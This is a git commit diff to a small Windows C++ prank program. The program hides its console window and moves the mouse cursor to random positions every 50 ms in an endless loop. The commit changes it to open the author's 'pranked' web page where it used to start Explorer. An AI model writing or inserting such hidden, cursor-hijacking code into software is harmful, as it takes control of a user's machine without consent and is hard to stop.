c0969638f9e3523782fd04953b7128c1c4dc18ec
ReisMiner <r1miner@outlook.com>
2021-05-18 12:33:13 +0200

    changed starting explorer to starting my website

--- main.cpp
+++ main.cpp
@@ -6,7 +6,7 @@
 
 int main() {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-    system("start explorer");
+    system("start https://reisminer.xyz/pranked");
     while(true) {
         _sleep(50);
         SetCursorPos(rand()%1000, rand()%1000);
